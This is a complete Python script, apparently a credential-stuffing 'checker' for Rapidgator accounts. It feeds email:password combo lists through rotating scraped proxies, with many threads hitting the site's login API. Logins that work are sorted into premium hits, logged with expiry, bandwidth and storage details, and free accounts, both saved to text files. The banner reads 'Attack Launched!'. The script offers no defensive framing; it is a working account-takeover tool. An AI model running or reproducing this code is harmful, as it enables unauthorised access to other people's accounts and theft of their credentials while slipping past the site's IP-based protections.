import requests
from colorama import Fore, init
import time
from random import choice
from os import _exit, system
import ctypes
from multiprocessing.dummy import Pool
from multiprocessing import Lock
import tkinter as tk
from tkinter import filedialog
import traceback
import re
import threading
from datetime import datetime

init()

bad = 0
free = 0
good = 0
loaded = 0
errors = 0
proxies = 0
checked = 0
lock = Lock()


class runner(object):
    def __init__(self, combo_name, Proxy_name, thread_number, proxy_type):
        self.combo_name = combo_name
        self.Proxy_name = Proxy_name
        self.thread_number = thread_number
        self.combo_list = []
        self.proxy_list = []
        self.proxy_type = proxy_type
        self.combo_loaded = sum(1 for _ in open(combo_name, 'r', errors='ignore'))
        self.start_time = time.time()  # used for CPM
        self.start = datetime.now()  # used to calculate how long the script has been running for


    def main(self, email, password):
        global loaded, good, bad, free, checked, errors
        while True:
            self.title()
            proxy = self.proxies()
            try:
                headers = {
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip;q=1.0, compress;q=0.5',
                    'Accept-Language': 'en;q=1.0, nl;q=0.9, de;q=0.8, en-AU;q=0.7, zh-Hans;q=0.6, fr;q=0.5',
                    'Connection': 'keep-alive',
                    'Host': 'rapidgator.net',
                    'User-Agent': 'RapidGator/1.1.2 (com.rapidgator.app; build:5; iOS 13.1.1) Alamofire/4.8.1'
                }

                r = requests.session()

                login = r.get(f'https://rapidgator.net/api/v2/user/login?login={email}&password={password}',
                                headers=headers, proxies=proxy, timeout=3)
                source = login.text
                json_data = login.json()

                if "Wrong e-mail or password" in source:
                    lock.acquire()
                    checked += 1
                    bad += 1
                    lock.release()

                elif "You requested login to your account from unusual Ip address" in source:
                    lock.acquire()
                    checked += 1
                    bad += 1
                    lock.release()

                elif 'is_premium":false' in source:
                    lock.acquire()
                    free += 1
                    checked += 1
                    free_accounts = open("Free.txt", 'a')
                    free_accounts.write(f"{email}:{password}\n")
                    lock.release()
                    
                elif 'is_premium":true' in source:
                    lock.acquire()
                    good += 1
                    checked += 1

                    expires = json_data["response"]["user"]["premium_end_time"]
                    expires = datetime.fromtimestamp(expires)
                    expires = f"{expires:%d/%m/%Y}"
                    total_bandwidth = json_data["response"]["user"]["traffic"]["total"]
                    bandwidth_left = json_data["response"]["user"]["traffic"]["left"]
                    bandwidth_left = int(bandwidth_left) / 1099511627776
                    total_bandwidth = int(total_bandwidth) / 1099511627776

                    if bandwidth_left >= 1:
                        bandwidth_left = str(float("{:.2f}".format(bandwidth_left))) + " TB"
                        total_bandwidth = str(float("{:.2f}".format(total_bandwidth))) + " TB"
                    else:
                        bandwidth_left = str(float("{:.2f}".format(bandwidth_left * 1000))) + " GB"
                        total_bandwidth = str(float("{:.2f}".format(total_bandwidth))) + " TB"

                    total_storage = json_data["response"]["user"]["storage"]["total"]
                    storage_left = json_data["response"]["user"]["storage"]["left"]

                    if storage_left != "unlimited":

                        storage_left = int(storage_left) / 1099511627776
                        total_storage = int(total_storage) / 1099511627776

                        if storage_left >= 1:
                            storage_left = str(float("{:.2f}".format(storage_left))) + " TB"
                            total_storage = str(float("{:.2f}".format(total_storage))) + " TB"
                            storage_left = f"{storage_left}/{total_storage}"
                        else:
                            storage_left = str(float("{:.2f}".format(storage_left * 1000))) + " GB"
                            total_storage = str(float("{:.2f}".format(total_storage))) + " TB"
                            storage_left = f"{storage_left}/{total_storage}"
                    else:
                        storage_left = "Unlimited"
                    print(
                        Fore.LIGHTGREEN_EX + '[SUCCESS]' + Fore.LIGHTBLUE_EX + f" {email}:{password} | Expires = {expires} | Bandwidth Available = {bandwidth_left}/{total_bandwidth} | Storage Left = {storage_left}")
                    hits = open("Hits.txt", 'a')
                    hits.write(
                        f"{email}:{password} | Expires = {expires} | Bandwidth Available = {bandwidth_left}/{total_bandwidth} | Storage Left = {storage_left}\n")
                    lock.release()

                elif "LOCKED FOR VIOLATION OF OUR TERMS. PLEASE CONTACT SUPPORT" in source:
                    lock.acquire()
                    checked += 1
                    bad += 1
                    lock.release()

                elif "Parameter login or password is missing" in source:
                    lock.acquire()
                    checked += 1
                    bad += 1
                    lock.release()

                else:
                    raise Exception
                break
            except:
                self.proxy_list.remove(proxy)
                errors += 1
                continue


    def title(self):
        percent = float("{:.2f}".format(int(checked) / self.combo_loaded * 100))
        timer = str(datetime.now() - self.start).split('.')[0]
        running = int(time.time() - self.start_time)
        
        if running <= 60:
            cpm = int(checked)
        else:
            get_minutes = running / 60
            cpm = int(checked / get_minutes)
        ctypes.windll.kernel32.SetConsoleTitleW(f"Rapidgator | Checked: {checked}/{self.combo_loaded} ({percent}%) | Hits: {good} | Free: {free} | Bad: {bad} | Errors: {errors} | CPM: {cpm} | Alive Proxies: {len(self.proxy_list)} | Elapsed Time: {timer}")

    def combo_loader(self):
        lines = open(combo_name, 'r', errors='ignore').readlines()
        combos = [combo.rstrip() for combo in lines]
        for line in combos:
            if ":" in line:
                new_line = line.split(':')
                self.combo_list.append({
                    "email": new_line[0],
                    "password": new_line[1]
                })

    def proxies(self):
        if len(self.proxy_list) == 0: 
            self.proxy_list = [proxy.rstrip() for proxy in open(self.Proxy_name, 'r', errors='ignore').readlines()]

            if self.proxy_type == '1':
                self.proxy_list = [{
                    "http": proxy,
                    "https": proxy
                    } for proxy in self.proxy_list]


            elif self.proxy_type == '2':
                self.proxy_list = [{
                    "http": "socks4://" + proxy,
                    "https": "socks4://" + proxy
                    } for proxy in self.proxy_list]

                    
            elif self.proxy_type == '3':
                self.proxy_list = [{
                    "http": "socks5://" + proxy,
                    "https": "socks5://" + proxy
                    } for proxy in self.proxy_list]


        return choice(self.proxy_list)
        #return self.proxy_list.pop()


    def sender(self, list_accounts):
        email = list_accounts["email"]
        password = list_accounts["password"]
        while True:
            try:
                self.main(email, password)
                break
            except Exception:
                pass

    def threads(self):
        self.combo_loader()
        pool = Pool(self.thread_number)

        try:
            for _ in pool.imap_unordered(self.sender, self.combo_list):
                pass
        except KeyboardInterrupt:
            _exit(0)

def title():
    print(Fore.LIGHTYELLOW_EX + """

                                 ____             _     _             _             
                                |  _ \ __ _ _ __ (_) __| | __ _  __ _| |_ ___  _ __ 
                                | |_) / _` | '_ \| |/ _` |/ _` |/ _` | __/ _ \| '__|
                                |  _ < (_| | |_) | | (_| | (_| | (_| | || (_) | |   
                                |_| \_\__,_| .__/|_|\__,_|\__, |\__,_|\__\___/|_|   
                                            |_|            |___/                     

            """)

def scrapeProxies():
    threading.Timer(600, scrapeProxies).start()  # Scrapes proxies every 10 minutes
    if proxy_type == '1':
        url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    elif proxy_type == '2':
        url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all'
    elif proxy_type == '3':
        url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=10000&country=all'
    requ = requests.session()
    scrape_proxies = requ.get(url).text
    proxies = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\:[0-9]{1,5}\b", str(scrape_proxies))
    Proxy_name = "Proxies.txt"
    with open(Proxy_name, 'w') as proxylist:
        for proxy in proxies:
            proxylist.write(proxy + "\n")


if __name__ == '__main__':
    try:
        title()
        thread_number = int(input("Enter the number of bots: "))
        print("Loading Wordlist...")
        root = tk.Tk()
        root.withdraw()

        combo_name = filedialog.askopenfilename(title="Load Wordlist",
                                                filetypes=(("Load Wordlist", "*.txt"), ("All", "*.*")))
        print(f"{sum(1 for _ in open(combo_name, 'r', errors='ignore'))} combos have been loaded\n")
        load_type = input("1. Load Proxies From File | 2. Scrape From ProxyScrape: ")
        proxy_type = input("Select Proxy Type: 1. Http/Https | 2. Socks4 | 3. Socks5: ")
        if load_type == '1':
            print("Loading ProxyList...")
            Proxy_name = filedialog.askopenfilename(title="Load ProxyList",
                                                    filetypes=(("Load ProxyList", "*.txt"), ("All", "*.*")))
            print(f"{sum(1 for _ in open(Proxy_name, 'r', errors='ignore'))} proxies have been loaded\n")
        else:
            scrapeProxies()
            Proxy_name = "Proxies.txt"
        time.sleep(2)
        system('cls')
        title()
        print(Fore.LIGHTWHITE_EX + "Attack Launched!\n")
        runner(combo_name, Proxy_name, thread_number, proxy_type).threads()

    except:
        print(traceback.format_exc())
        print("Something went wrong, read error above for more info")
input("Finished! You can close this window now!")
